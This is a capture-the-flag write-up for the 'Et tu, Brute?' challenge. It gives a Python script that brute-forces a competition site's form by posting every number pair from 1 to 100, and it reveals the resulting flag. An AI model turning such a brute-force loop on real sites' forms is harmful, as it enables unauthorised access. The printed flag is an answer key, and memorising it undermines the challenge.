# Et tu, Brute?

> I want to see how many people are actually my friends and aren't just pretending! Only my best friends get flags. You can check our friendship status at this website. [mhsctf-ettubrute.0xmmalik.repl.co](https://mhsctf-ettubrute.0xmmalik.repl.co/) (you may need to wait for the site to wake up)

Use brute force.

```python
import requests

url = "https://mhsctf-ettubrute.0xmmalik.repl.co/status.php"

found = False

for i in range(1,101):
        for j in range(1,101):
                data = {'number': i, 'number2': j}
                print("Trying " + str(i) + " and " + str(j)) 
                send = requests.post(url, data = data)
                if "flag" in str(send.content):
                        print("The numbers are: " + str(i) + "  and " +  str(j))
                        found = True
                        break
        if found == True:
                break
```

Using the script to find the values needed and submitting them will give the flag `flag{pur3_s7r3ngth}`.
